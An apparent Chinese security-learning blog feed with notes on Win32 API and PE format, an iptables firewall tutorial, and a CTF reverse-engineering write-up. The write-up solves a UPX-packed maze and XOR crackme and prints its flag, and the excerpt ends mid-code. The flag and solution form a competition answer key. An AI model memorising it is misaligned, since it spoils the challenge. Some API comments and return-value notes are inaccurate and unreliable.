<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ESE&#39;s Note</title>
  
  <subtitle>阅览室</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-12-30T05:07:37.953Z</updated>
  <id>http://yoursite.com/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>加密与解密——基础篇</title>
    <link href="http://yoursite.com/2017/12/30/encode_and_decode/"/>
    <id>http://yoursite.com/2017/12/30/encode_and_decode/</id>
    <published>2017-12-30T02:02:57.605Z</published>
    <updated>2017-12-30T05:07:37.953Z</updated>
    
    <content type="html"><![CDATA[<p>迟迟没有学习的加密与解密，现在开始吧<br><a id="more"></a></p><h1 id="一、Win-API简介"><a href="#一、Win-API简介" class="headerlink" title="一、Win API简介"></a>一、Win API简介</h1><p>API(Application Programming Interface)应用程序编程接口。在早期，windows的主要部分只需要三个动态链接库中实现，这代表了windows三个主要子系统——Kernel,User和GDI.<br>Kernel:操作系统的核心功能服务，包括进程与线程控制，内存管理，文件访问等。<br>User:负责处理用户接口，包括键盘和鼠标输入，窗口和菜单管理等。<br>GDI:图形设备接口，允许程序在屏幕上和打印机上显示文本和图像。</p><h1 id="二、常用的Win32-API函数"><a href="#二、常用的Win32-API函数" class="headerlink" title="二、常用的Win32 API函数"></a>二、常用的Win32 API函数</h1><h3 id="1、GetWindowText函数"><a href="#1、GetWindowText函数" class="headerlink" title="1、GetWindowText函数"></a>1、GetWindowText函数</h3><p>此函数在USER32.DLL用户模块中，它的作用是取得一个窗体的标题文字，或者一个文本控件的内容。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetWindowText</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hwnd,  <span class="comment">//窗口或文本控件句柄</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpString,<span class="comment">//缓冲区地址</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nMaxCount<span class="comment">//复制的最大字符数</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是GetWindowTextA,Unicode版是GetWindowTextW.</p><h3 id="2、GetDlgItem函数"><a href="#2、GetDlgItem函数" class="headerlink" title="2、GetDlgItem函数"></a>2、GetDlgItem函数</h3><p>此函数在USER32.DLL用户模块中，它的作用是获取制定对话框的句柄。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function">HWND <span class="title">GetDlgItem</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hDlg,<span class="comment">//对话框句柄</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nIDDlgItem<span class="comment">//控件标识</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回对话框句柄，失败就返回零。</p><h3 id="3、GetDlgItemText函数"><a href="#3、GetDlgItemText函数" class="headerlink" title="3、GetDlgItemText函数"></a>3、GetDlgItemText函数</h3><p>此函数在USER32.DLL用户模块中，它的作用是获取对话框的文本。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">UINT <span class="title">GetDlgItemText</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hDlg,  <span class="comment">//对话框句柄</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nIDDlgItem,<span class="comment">//控件标识(ID号)</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpString,<span class="comment">//缓冲区地址</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nMaxCount<span class="comment">//复制的最大字符数</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是GetDlgItemTextA,Unicode版是GetDlgItemTextW.</p><h3 id="4、GetDlgItemInt函数"><a href="#4、GetDlgItemInt函数" class="headerlink" title="4、GetDlgItemInt函数"></a>4、GetDlgItemInt函数</h3><p>此函数在USER32.DLL用户模块中，它的作用是获取对话框的整数。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">UINT <span class="title">GetDlgItemInt</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hDlg,  <span class="comment">//对话框句柄</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nIDDlgItem,<span class="comment">//控件标识(ID号)</span></span></span></div><div class="line"><span class="function"><span class="params">BOOL *lpTranslated,<span class="comment">//接收成功/失败指示的指针</span></span></span></div><div class="line"><span class="function"><span class="params">BOOL bSigned<span class="comment">//指定为有符号还是无符号</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是GetDlgItemIntA,Unicode版是GetDlgItemIntW.</p><h3 id="5、MessageBox函数"><a href="#5、MessageBox函数" class="headerlink" title="5、MessageBox函数"></a>5、MessageBox函数</h3><p>此函数在USER32.DLL用户模块中，创建和显示信息框<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">UINT <span class="title">MessageBox</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hWnd,  <span class="comment">//父窗口句柄</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpText,<span class="comment">//消息框文本地址</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpCaption,<span class="comment">//消息框标题地址</span></span></span></div><div class="line"><span class="function"><span class="params">UINT uType<span class="comment">//复制的最大字符数</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：如果成功就返回文本长度，失败就返回零。<br>ANSI版是MessageBoxA,Unicode版是MessageBoxW.</p><h1 id="三、什么是句柄"><a href="#三、什么是句柄" class="headerlink" title="三、什么是句柄"></a>三、什么是句柄</h1><p>句柄(Handle)在Windows中使用非常频繁，它是Windows标识，由应用程序建立或使用的对象所使用的一个唯一的整数值(通常32位)。程序通过调用Windows函数获取句柄，然后在其他Window函数中使用这个句柄，以引用它代表的的对象。句柄的实际值对程序来说无关紧要。</p><h1 id="四、Windows消息机制"><a href="#四、Windows消息机制" class="headerlink" title="四、Windows消息机制"></a>四、Windows消息机制</h1><p>Windows是一个消息(Message)驱动式系统，Windows消息提供应用程序与应用程序，应用程序与Windows系统之间进行通信的手段。应用程序想要实现的 功能由消息来触发，并且靠对消息的响应和处理来完成。<br>Windows系统中有两种消息列队:一种是系统消息列队，另一种是应用程序消息列队。计算机的所有输入设备由Windows监控。当一个事件发生时，Windwos先将输入的消息放入系统消息队列中，再将输入的消息拷贝到相应的程序队列中，应用程序中的消息循环从它的消息队列中检索每个消息并且发给相应的窗口函数中。总是按到达的先后排队(一些系统消息除外)，这就使得一些外部实时事件可能得不到及时的处理。</p><h3 id="1、SendMessage函数"><a href="#1、SendMessage函数" class="headerlink" title="1、SendMessage函数"></a>1、SendMessage函数</h3><p>调用一个窗口的窗口函数，将一条消息发给那个窗口。除非消息处理完毕，否则该函数不会返回。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">LRESULT <span class="title">SendMessage</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hWnd,<span class="comment">//目的窗口的句柄</span></span></span></div><div class="line"><span class="function"><span class="params">UINT Msg,<span class="comment">//消息标识符</span></span></span></div><div class="line"><span class="function"><span class="params">WPARAM wParam,<span class="comment">//消息的WPARAM域</span></span></span></div><div class="line"><span class="function"><span class="params">LPARAM lParam<span class="comment">//消息的LPARAM域</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span></div></pre></td></tr></table></figure></p><p>返回值：由具体的消息决定，如消息投递成功，返回TURE(非零)</p><h3 id="2、WM-COMMAND消息"><a href="#2、WM-COMMAND消息" class="headerlink" title="2、WM_COMMAND消息"></a>2、WM_COMMAND消息</h3><p>当用户从菜单或按钮中选择一条命令或者一个控件发给它的父窗口，或者当一个快捷键被释放时发送。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">WM_COMMAND</div><div class="line">wNotifyCode = HIWORD(wParam);<span class="comment">//通告代码</span></div><div class="line">wID = LOWORD(wParam)   <span class="comment">//菜单条目，控件标识符</span></div><div class="line">hwndCtl = (HWND) lParam, <span class="comment">//控件句柄</span></div><div class="line">)</div></pre></td></tr></table></figure></p><p>返回值：系统处理这条消息，返回零</p><h1 id="五、虚拟内存"><a href="#五、虚拟内存" class="headerlink" title="五、虚拟内存"></a>五、虚拟内存</h1><p>  虚拟内存(Virtual Memory)不是真正的内存,他通过映射(Map)的方法，使可使用的虚拟地址(Virtual Address)达到4GB。<br>简单地说，虚拟内存的实现方法和过程如下:</p><p>(1)当一个应用程序被启动时，操作系统就创建一个新进程，并给每个进程分配2GB的虚拟地址(不是内存，是地址)<br>(2)虚拟内存管理器将应用程序的代码映射到那个程序代码的物理地址中的某个位置，并把当前所需要的代码读取到物理地址中(虚拟地址和应用程序代码在的物理内存中的位置是没有关系的)<br>(3)如果使用动态链接库DLL,DLL也被映射到进程的虚拟地址的空间，在需要的时候才被读入物理内存<br>(4)其它项目(例如数据，堆栈等)的空间是从物理内存中分配的，并被映射到虚拟空间中<br>(5)应用程序通过使用它的虚拟地址空间中的地址开始执行，然后虚拟内存管理器每次把内存的内存访问映射到物理位置<br>如果上面步骤不能理解，那明白以下几点就可以了：<br>1、应用程序不会直接访问物理地址<br>2、虚拟内存管理器通过虚拟地址的访问请求，控制所有的物理地址访问<br>3、每个应用程序都有互相独立的4GB寻址空间，不同应用程序的地址空间是隔离的<br>4、DLL程序没有自己”私有”空间，它们总是被映射打其它应用程序的地址空间。</p><h4 id="使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。"><a href="#使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。" class="headerlink" title="使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。"></a>使用虚拟内存的好处是：简化内存的管理，并可弥补物理内存的不足，可以防止多任务环境下各个应用程序之间的冲突。</h4><h1 id="六、简单介绍PE"><a href="#六、简单介绍PE" class="headerlink" title="六、简单介绍PE"></a>六、简单介绍PE</h1><p>Windows的可执行文件(EXE,DLL)是PE(Portable Executable)格式。PE文件使用的一个平面地址空间 ，所有的数据都被合并在一起，组成一个很大的结构。文件的内容被分割成不同的区块(Section,又称区段，节等)，块中包含代码和数据。每一个块都有他自己在内存中的一套属性(可读，可写等)。<br>每一个区块都有不同的名字，这个名字表示区块代码的功能。常见的区块有.text,.rdata,.data,.rsrc等<br>.text:是在编译或汇编结束时产生的一种块，它的内容全是指令代码<br>.rdata:是运行期只读数据<br>.data:是初始化的数据块<br>.idata:包含其它外来DLL的函数技巧数据，即输入表。<br>.rsrc:包含模块的全部资源，如图标，菜单，位图等。<br>PE文件非常好的一个地方就是在磁盘上的数据与内存中的结构图是一致的。<br><img src="http://chuantu.biz/t6/190/1514609990x-1566657870.png" alt=""><br>PE相关的名词解释如下:<br>(1)入口点(Entry Point)<br>PE文件执行时的入口点。也就是程序在执行时的第一行代码的地址应该是就这个值。<br>(2)文件偏移地址(File Offset)<br>当PE文件存储在磁盘上时，各数据的地址称做文件偏移地址 ，文件偏移地址从PE文件的第一个字节开始计数，起始值是0<br>(3)虚拟地址(Virtual Address,VA)<br>由于Windows程序运行在386保护模式下，所以程序访问存储器所使用的逻辑地址称为虚拟地址VA,又称为内存偏移地址。<br>(4)基地址(ImageBase)<br>文件执行时将被映射到指定的地址中，这个初始化内存地址称为基地址，这个值是由PE文件本身设定的。<br>(5)相对虚拟地址(Relative Virual Address,RVA)<br>表示此段代码在内存中相对于基地址的偏移,即：<br>相对虚拟地址（RVA）=虚拟地址（VA）-基址（ImageBase）</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;迟迟没有学习的加密与解密，现在开始吧&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Liunx下的iptables</title>
    <link href="http://yoursite.com/2017/12/19/iptables/"/>
    <id>http://yoursite.com/2017/12/19/iptables/</id>
    <published>2017-12-19T12:20:31.231Z</published>
    <updated>2017-12-19T14:14:33.509Z</updated>
    
    <content type="html"><![CDATA[<p>iptables是linux下的防火墙，得好好学习。<br><a id="more"></a></p><h2 id="1、iptables是什么"><a href="#1、iptables是什么" class="headerlink" title="1、iptables是什么"></a>1、iptables是什么</h2><p>iptables是netfilter的基本框架，即liunx发行版下的防火墙，其实就是过滤数据包。<br>举个栗子: 当Internet来了一个主机，想要进入主机。这时，会先经过iptables的规则，检查通过则接受(accept),否则，就会丢弃(drop)。iptables的规则是有顺序的，从开始配置，若是某一条匹配成功，则执行这条规则，后面的规则都不会执行。当所有的规则都不匹配，则丢弃(drop).</p><h2 id="1、iptables的策略"><a href="#1、iptables的策略" class="headerlink" title="1、iptables的策略"></a>1、iptables的策略</h2><p>一般分为两种策略: “通”策略(定义只有指定ip能访问)和”堵”策略(所有的都能访问，但是有身份认证)</p><p>因为iptable有许多的规则，所有我们定义了许多的表(table),每个表的规则都不一样。比如filter,nat，mangle</p><p>数据包中允许或者不允许进入本机——filter(过滤器)<br>地址转换的功能的则是——nat(地址转换)<br>修改报文原数据的标志位——mangle(数据包修改QOS)</p><h2 id="2、iptables常见的表"><a href="#2、iptables常见的表" class="headerlink" title="2、iptables常见的表"></a>2、iptables常见的表</h2><p>每个表中有许多的规则链</p><p>filter(过滤器)——主要用于防火墙<br><code>INPUT</code>:处理输入数据包规则链<br><code>OUTPUT</code>:处理输出数据包规则链<br><code>FORWARD</code>:将来到本机的数据包转发到其它主机(这里与nat有关)的规则链</p><p>nat(地址转换)<br><code>PREROUTING</code> :地址转换前的规则<br><code>POSTROUTING</code>:地址转换后的规则<br><code>OUTPUT</code>: 与发送出去的数据包有关</p><p>mangle(修改数据包）<br>mangle表的主要功能是根据规则修改数据包的一些标志位，以便其他规则或程序可以利用这种标志对数据包进行过滤或策略路由。</p><p>最常用的是filter表，我们的主要学习对象</p><h2 id="3、iptables命令"><a href="#3、iptables命令" class="headerlink" title="3、iptables命令"></a>3、iptables命令</h2><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p>iptables (选项) (参数)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">-t&lt;表&gt;：指定要操纵的表； </div><div class="line">-A：向规则链中添加条目,添加到尾部； </div><div class="line">-D：从规则链中删除条目； </div><div class="line">-I：向规则链中插入条目,默认添加到首部； </div><div class="line">-R：替换规则链中的条目； </div><div class="line">-L：显示规则链中已有的条目； </div><div class="line">-F：清楚规则链中已有的条目； </div><div class="line">-Z：清空规则链中的数据包计算器和字节计数器； </div><div class="line">-N：创建新的用户自定义规则链； </div><div class="line">-P：定义规则链中的默认目标； </div><div class="line">-h：显示帮助信息； </div><div class="line">-p：指定要匹配的数据包协议类型； </div><div class="line">-s：指定要匹配的数据包源ip地址； </div><div class="line">-j&lt;目标&gt;：指定要跳转的目标； </div><div class="line">-i&lt;网络接口&gt;：指定数据包进入本机的网络接口； </div><div class="line">-o&lt;网络接口&gt;：指定数据包要离开本机所使用的网络接口。</div></pre></td></tr></table></figure></p><h4 id="iptables命令选项输入顺序："><a href="#iptables命令选项输入顺序：" class="headerlink" title="iptables命令选项输入顺序："></a>iptables命令选项输入顺序：</h4><p><code>iptables -t 表名 &lt;-A/I/D/R&gt; 规则链名 [规则号] &lt;-i/o 网卡名&gt; -p 协议名 &lt;-s 源IP/源子网&gt; --sport 源端口 &lt;-d 目标IP/目标子网&gt; --dport 目标端口 -j 动作</code></p><h4 id="一些动作"><a href="#一些动作" class="headerlink" title="一些动作"></a>一些动作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">accept：接收数据包。 </div><div class="line">DROP：丢弃数据包。 </div><div class="line">REDIRECT：重定向、映射、透明代理。 </div><div class="line">SNAT：源地址转换。 </div><div class="line">DNAT：目标地址转换。 </div><div class="line">MASQUERADE：IP伪装（NAT），用于ADSL。 </div><div class="line">LOG：日志记录。</div></pre></td></tr></table></figure><h4 id="添加规则-如-屏蔽ip"><a href="#添加规则-如-屏蔽ip" class="headerlink" title="添加规则(如:屏蔽ip)"></a>添加规则(如:屏蔽ip)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -j DROP #屏蔽所有IP的命令 </div><div class="line">iptables -A INPUT -s 192.168.1.25 -j DROP #将这条命令添加到规则的尾部，屏蔽单个IP的命令 </div><div class="line">iptables -I INPUT -s 192.168.1.1/24 -j DROP #封整个段即从192.168.1.0到192.168.1.255的命令</div></pre></td></tr></table></figure><h4 id="删除规则"><a href="#删除规则" class="headerlink" title="删除规则"></a>删除规则</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -D INPUT -s 192.168.1.25 -j DROP #将这条命令从规则中删除</div><div class="line">iptables -D INPUT 2 #删除INPUT里面的第2条规则(从最上面开始)</div></pre></td></tr></table></figure><h4 id="限定某个ip登录ssh"><a href="#限定某个ip登录ssh" class="headerlink" title="限定某个ip登录ssh"></a>限定某个ip登录ssh</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iptables -A INPUT -p tcp --dport 22 -s 192.168.1.35 -j ACCEPT </div><div class="line">iptables -A INPUT -p tcp --dport 22 -j DROP</div></pre></td></tr></table></figure><h4 id="更改所有来自192-168-1-0-24的数据包的源ip地址为1-2-3-4-nat地址转化"><a href="#更改所有来自192-168-1-0-24的数据包的源ip地址为1-2-3-4-nat地址转化" class="headerlink" title="更改所有来自192.168.1.0/24的数据包的源ip地址为1.2.3.4(nat地址转化)"></a>更改所有来自192.168.1.0/24的数据包的源ip地址为1.2.3.4(nat地址转化)</h4><p><code>iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j SNAT --to 1.2.3.4</code></p><h4 id="查看的iptables规则"><a href="#查看的iptables规则" class="headerlink" title="查看的iptables规则"></a>查看的iptables规则</h4><p><code>iptables -nL --line-number</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;iptables是linux下的防火墙，得好好学习。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>悄悄的wp</title>
    <link href="http://yoursite.com/2017/12/11/2017_12_11_zjgsctf_re_wp/"/>
    <id>http://yoursite.com/2017/12/11/2017_12_11_zjgsctf_re_wp/</id>
    <published>2017-12-11T08:10:07.106Z</published>
    <updated>2017-12-12T01:21:10.036Z</updated>
    
    <content type="html"><![CDATA[<p>这次比赛，有点坑逆向选手，再次感谢各位宽容大方善良美丽可爱小伙伴们。。。。<br><a id="more"></a></p><h3 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h3><p>用peid查壳，发现是upx加壳，直接脱壳（ESP定律或者直接找脱壳工具），用IAD打开<br>发现关键函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">__<span class="function">int64 <span class="title">main_0</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> v0; <span class="comment">// edx</span></div><div class="line">  __int64 v1; <span class="comment">// ST00_8</span></div><div class="line">  <span class="keyword">char</span> Buffer; <span class="comment">// [esp+D0h] [ebp-3Ch]</span></div><div class="line"></div><div class="line">  <span class="built_in">puts</span>(<span class="string">"input your Secret:"</span>);</div><div class="line">  gets(&amp;Buffer);</div><div class="line">  <span class="keyword">if</span> ( sub_4110E6((<span class="keyword">int</span>)&amp;unk_417680, &amp;Buffer) )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( sub_41102D(&amp;unk_417680) )</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"flag is flag&#123;%s&#125;\n"</span>, &amp;Buffer);</div><div class="line">    <span class="keyword">else</span></div><div class="line">      <span class="built_in">printf</span>(<span class="string">"you can do it,again\n"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"sorry\n"</span>);</div><div class="line">  &#125;</div><div class="line">  HIDWORD(v1) = v0;</div><div class="line">  LODWORD(v1) = <span class="number">0</span>;</div><div class="line">  <span class="keyword">return</span> v1;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>发现sub_4110E6功能如下（简单xor），发现key<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411520</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *Str)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+DCh] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">if</span> ( j_strlen(Str) != <span class="number">28</span> )</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i )</div><div class="line">    *(_BYTE *)(i + a1) = LOBYTE(dword_417000[i]) ^ Str[i];</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>发现sub_41102D函数，如果做过类似题的话，知道这是一个迷宫题目，因为发现正好是上下左右，并且一步都会判断是否出错，因为是+16，判断为宽16<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_4115D0</span><span class="params">(<span class="keyword">int</span> a1)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+D0h] [ebp-20h]</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  v2 = <span class="string">'&#125;'</span>;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">switch</span> ( *(_BYTE *)(i + a1) )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">case</span> <span class="string">'l'</span>:</div><div class="line">        --v2;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'r'</span>:</div><div class="line">        ++v2;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'f'</span>:</div><div class="line">        v2 += <span class="number">16</span>;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="keyword">case</span> <span class="string">'b'</span>:</div><div class="line">        v2 -= <span class="number">16</span>;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ( byte_417070[v2] == <span class="string">'d'</span> )</div><div class="line">      <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> ( byte_417070[v2] != <span class="string">'1'</span> )</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>OD加载，发现迷宫，s是开始 ，d是结束，每一步都是1（否则失败），l向左，r向右，f向下，b向上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0000000000000000</div><div class="line">0   1111111111 0</div><div class="line">0   1        1 0</div><div class="line">0   1        11d</div><div class="line">0   1          0</div><div class="line">0   1111111111 0</div><div class="line">0            1 0</div><div class="line">0000000000000s00</div><div class="line">``</div><div class="line">得到字符串`bblllllllllbbbbrrrrrrrrrffrr`，用python写xor代码得</div><div class="line">``` C</div><div class="line">def Re1_qimo():</div><div class="line">    c = []</div><div class="line">    str = &apos;bblllllllllbbbbrrrrrrrrrffrr&apos;</div><div class="line">    key = [0x2B,0x16,0x33,0x05,0x1F,0x33,0x19,0x1C,0x14,0x33,0x0D,0x0C,0x06,0x3D,0x0F,0x13,0x02,0x2D,0x0B,0x1D,0x07,0x2D,0x19,0x1C,0x56,0x11,0x53,0x53]</div><div class="line">    for i in range(28):</div><div class="line">        c.append(chr(ord(str[i])^key[i]))</div><div class="line">    print &quot;&quot;.join(c)</div></pre></td></tr></table></figure></p><p>flag: It_is_upx_and_map_you_kn0w!!</p><h3 id="Re2"><a href="#Re2" class="headerlink" title="Re2"></a>Re2</h3><p>这里再次对各位小伙伴感到抱歉，我自己没有测试好，导致这题目无解，也感谢小伙伴的宽容。</p><h3 id="Re3"><a href="#Re3" class="headerlink" title="Re3"></a>Re3</h3><p>有ida打开，发现tls,脱去TLS可以参考<a href="https://esebanana.github.io/2017/10/10/re_tls/" target="_blank" rel="external">https://esebanana.github.io/2017/10/10/re_tls/</a><br>发现第一个加密用户名函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_412530</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> k; <span class="comment">// [esp+D0h] [ebp-54h]</span></div><div class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+DCh] [ebp-48h]</span></div><div class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-3Ch]</span></div><div class="line">  __int16 v4[<span 